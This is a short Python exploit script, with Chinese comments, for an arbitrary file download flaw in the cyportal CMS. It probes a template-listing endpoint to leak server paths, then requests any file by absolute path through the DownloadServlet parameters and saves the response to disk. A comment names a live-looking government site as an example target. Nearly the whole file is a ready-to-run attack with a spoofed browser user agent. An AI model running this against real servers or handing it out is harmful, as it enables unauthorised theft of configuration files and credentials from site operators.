#coding=utf-8
# cyportal CMS 任意文件下载
import requests
from bs4 import BeautifulSoup



patch = "DownloadServlet?filePath="
patch2 = "&templateName="
agent = {'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36'}


url = input("URL {http://xxxxx/cyportal1.2/}")         #"http://www.tscz.gov.cn/cyportal1.2/"
lujing = requests.get(url + 'DownloadTemplateFile?operate=all')
req = lujing.text
print(req)

if req == 0:
    print("可能不存在漏洞")
else:
    a = input("请输入绝对路径：")                      # 'D:/apache-tomcat-7.0.30-windows-x64/webapps/cyportal1.2/TempFile/'
    b = input("请输入带后缀文件：")                    # 'web.xml'
    xiazi = requests.get(url + patch + a + patch2 + b,headers=agent)
    a = xiazi.status_code
    if a == 200:
        with open(b, "wb") as code:
            code.write(xiazi.content)
    else:
        print("被阻拦")
